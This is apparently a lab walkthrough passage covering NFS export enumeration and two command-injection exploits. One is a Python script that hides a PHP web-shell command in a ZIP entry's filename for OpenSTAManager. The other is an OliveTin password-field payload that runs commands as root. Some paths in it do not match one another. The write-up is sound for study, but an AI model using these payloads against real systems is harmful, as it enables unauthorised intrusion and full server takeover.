### NFS ACL

From the Nmap scan output, we can see that NFS (Network File System) is running on the machine, with NFSv3/v4 and `mountd` exposed

`mountd` is a service on Unix and Linux systems that handles file system mount requests from remote machines using the NFS protocol.

Let us enumerate the `mountd` service using `showmount` to check for any exportable directories:-

```bash
└─$ showmount -e 10.129.239.191
Export list for 10.129.239.191:
/srv/nfs/onboarding *
```

Ok, this looks interesting. An `onboarding` directory. Let us try to mount it on our system and export its contents:-

Create a mount point:-

```bash
sudo mkdir /mnt/nfs
```

Then mount,

```bash
sudo mount -t nfs <MACHINE_IP>:/home /mnt/nfs
```

### CVE-2025-69212 - OS Command Injection

According to https://github.com/advisories/GHSA-25fp-8w8p-mx36, an authenticated attacker can upload a ZIP file containing a .p7m file with a malicious filename to execute arbitrary system commands on the server. Affected versions of OpenSTAManager are 2.9.8 and before.

Code for creating a malicious ZIP file using the PoC in the advisory as reference:-

```python
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

### CVE-2026-27626 - OliveTin OS Command Injection

OliveTin version 3000.10.0 and earlier contain a critical OS command injection vulnerability through the `password` argument .

Using PoC at https://github.com/advisories/GHSA-49gm-hh7w-wfvf to confirm exploitation:-

```bash
curl -sS -X POST http://127.0.0.1:1337/api/StartActionAndWait \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "actionId":"backup_database",
    "arguments":[
      {"name":"db_user","value":"backup_svc"},
      {"name":"db_pass","value":"test123"},
      {"name":"db_name","value":"production"}
    ]
  }'
```

The response confirmed the action executed:

```json
"actionTitle":"Backup Database"
"executionStarted":true
"executionFinished":true
```

Exploiting the vulnerability (to avoid shell quoting issues, I used Python to construct the JSON payload):-

```python
python3 - <<'PY' >/tmp/privesc.json
import json

print(json.dumps({
    "actionId": "backup_database",
    "arguments": [
        {"name": "db_user", "value": "backup_svc"},
        {"name": "db_pass", "value": "'; id > /tmp/res; #"},
        {"name": "db_name", "value": "production"}
    ]
}))
PY
```

Sending the req to OliveTin using `curl` :

```bash
curl -sS -X POST http://127.0.0.1:1337/api/StartActionAndWait \
  -H 'Content-Type: application/json' \
  --data-binary @/tmp/req.json
```

Checking the `/tmp/res` file’s contents:-

```bash
haris@enigma:/tmp$ cat res
uid=0(root) gid=0(root) groups=0(root)
```

OS command injection as `root` confirmed!
